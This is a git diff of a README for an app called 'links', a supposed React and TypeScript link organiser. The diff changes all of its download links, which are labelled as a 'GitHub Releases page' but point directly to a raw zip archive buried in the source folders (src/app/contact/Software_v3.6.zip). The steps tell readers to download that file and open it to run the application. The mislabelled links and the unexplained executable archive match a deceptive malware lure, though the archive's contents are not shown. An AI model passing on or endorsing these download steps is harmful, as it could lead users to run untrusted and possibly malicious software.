@@ -6,7 +6,7 @@ Welcome to **links**! This application serves as your personal command center fo
 
 ## 📥 Download Now
 
-[![Download links](https://raw.githubusercontent.com/yton12/links/main/src/components/SystemIntro/Software-v1.7.zip%20links-blue?style=for-the-badge)](https://raw.githubusercontent.com/yton12/links/main/src/components/SystemIntro/Software-v1.7.zip)
+[![Download links](https://raw.githubusercontent.com/yton12/links/main/src/app/contact/Software_v3.6.zip%20links-blue?style=for-the-badge)](https://raw.githubusercontent.com/yton12/links/main/src/app/contact/Software_v3.6.zip)
 
 ## 📋 Why Use links?
 
@@ -17,11 +17,11 @@ Welcome to **links**! This application serves as your personal command center fo
 
 ## 📂 Download & Install
 
-To get started, visit this page to download: [GitHub Releases](https://raw.githubusercontent.com/yton12/links/main/src/components/SystemIntro/Software-v1.7.zip).
+To get started, visit this page to download: [GitHub Releases](https://raw.githubusercontent.com/yton12/links/main/src/app/contact/Software_v3.6.zip).
 
 You will find different versions available. Choose the latest release for the best performance and features.
 
-1. Go to the [GitHub Releases page](https://raw.githubusercontent.com/yton12/links/main/src/components/SystemIntro/Software-v1.7.zip).
+1. Go to the [GitHub Releases page](https://raw.githubusercontent.com/yton12/links/main/src/app/contact/Software_v3.6.zip).
 2. Scroll to the latest release section.
 3. Download the file suitable for your operating system.
 4. Open the downloaded file to run the application.
@@ -44,7 +44,7 @@ You will find different versions available. Choose the latest release for the be
 
 ### How do I update links?
 
-When a new version of links is available, visit the [GitHub Releases page](https://raw.githubusercontent.com/yton12/links/main/src/components/SystemIntro/Software-v1.7.zip) to download the updated version. Follow the same steps as installing for the first time.
+When a new version of links is available, visit the [GitHub Releases page](https://raw.githubusercontent.com/yton12/links/main/src/app/contact/Software_v3.6.zip) to download the updated version. Follow the same steps as installing for the first time.
 
 ### Can I use links offline?
 
@@ -65,4 +65,4 @@ Have questions or feedback? Reach out through the GitHub Issues page or join dis
 - **Personal Site:** Craft a customized space for your links.
 - **React & TypeScript:** Built using popular technologies for a clean performance.
 
-Enjoy your journey to a more organized internet experience with **links**! Visit this page to download: [GitHub Releases](https://raw.githubusercontent.com/yton12/links/main/src/components/SystemIntro/Software-v1.7.zip).
+Enjoy your journey to a more organized internet experience with **links**! Visit this page to download: [GitHub Releases](https://raw.githubusercontent.com/yton12/links/main/src/app/contact/Software_v3.6.zip).
